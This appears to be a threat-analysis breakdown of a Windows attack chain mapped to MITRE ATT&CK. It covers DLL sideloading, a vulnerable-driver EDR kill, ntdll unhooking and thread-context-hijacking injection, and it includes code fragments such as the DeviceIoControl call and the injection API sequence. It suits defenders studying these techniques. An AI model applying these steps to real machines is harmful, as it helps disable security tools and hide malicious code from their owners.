01 · Initial Access + Execution T1566.002 T1204.002

02 02 · Staging T1105
Download Signed Legitimate Binary + Malicious DLL
  • Downloader fetches a trusted-vendor-signed EXE + malicious DLL from attacker cloud bucket
  • Both saved to the same folder — prerequisite for sideloading; DLL embeds drivers + shellcode in .rsrc
Staged to: %APPDATA%\[random_folder]\ LegitApp.exe <- signed by trusted vendor, clean TargetDLL.dll <- malicious, embeds drivers + shellcode

03 03 · DLL Sideloading T1574.002
Malicious Code Runs Inside a Signed Trusted Process
  • Windows DLL search order checks the application directory before System32 — malicious DLL wins
  • Attack runs inside a signed trusted process; EDR sees clean binary loading its own DLL — low suspicion
LegitApp.exe asks Windows: "where is TargetDLL.dll?" Windows checks: application directory first -> FOUND Loads TargetDLL.dll into process memory automatically DllMain() executes -> attack begins inside trusted process
>>> KERNEL BOUNDARY     RING 3 → RING 0
Everything below this line executes with kernel-level privileges — EDR user-mode hooks cannot interfere

04 04 · BYOVD — Bring Your Own Vulnerable Driver T1562.001 RING 0
EDR Killed from Ring 0 via Vulnerable Signed Driver
  • DLL drops embedded .sys drivers, loads via SCM, sends IOCTL with EDR PID
  • Driver calls ZwTerminateProcess(EDR) from Ring 0 — PPL, self-protection callbacks all bypassed
  • Multiple drivers = fallback chain if one hits the blocklist
DeviceIoControl( hVulnDriver, IOCTL_KILL_PROCESS, &edr_pid, sizeof(DWORD), NULL, 0, NULL, NULL ); // ZwTerminateProcess(EDR) executes from Ring 0 // PPL protection, self-protection callbacks — all bypassed
05
05 05 · Defense Evasion T1562.001
NTDLL Unhooking — Removing EDR's User-Mode Visibility
  • Read a clean ntdll.dll from disk, overwrite hooked in-memory bytes — JMP hooks gone
  • Syscalls now reach kernel directly; combined with BYOVD = complete EDR blind spot
// Before unhooking — EDR intercepts every syscall: NtCreateProcess: JMP edr_hook -> EDR inspects + logs // After unhooking — original bytes restored from disk: NtCreateProcess: MOV R10, RCX MOV EAX, syscall_num SYSCALL <- goes direct to kernel RET <- EDR sees nothing

06 06 · C2 Communication + Process Injection T1055.003
Thread-Context Hijacking into a Trusted System Process
  • Shellcode fetched from C2 over encrypted channel — never touches disk
  • Injected into a trusted system process; existing thread RIP hijacked — no new thread created
OpenProcess(PROCESS_ALL_ACCESS, target_pid) VirtualAllocEx(hProc, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE) WriteProcessMemory(hProc, pRemote, shellcode, size) OpenThread(THREAD_ALL_ACCESS, thread_id) SuspendThread(hThread) GetThreadContext(hThread, &ctx) ctx.Rip = (DWORD64)pRemote // hijack RIP to shellcode SetThreadContext(hThread, &ctx) ResumeThread(hThread) // payload now executing
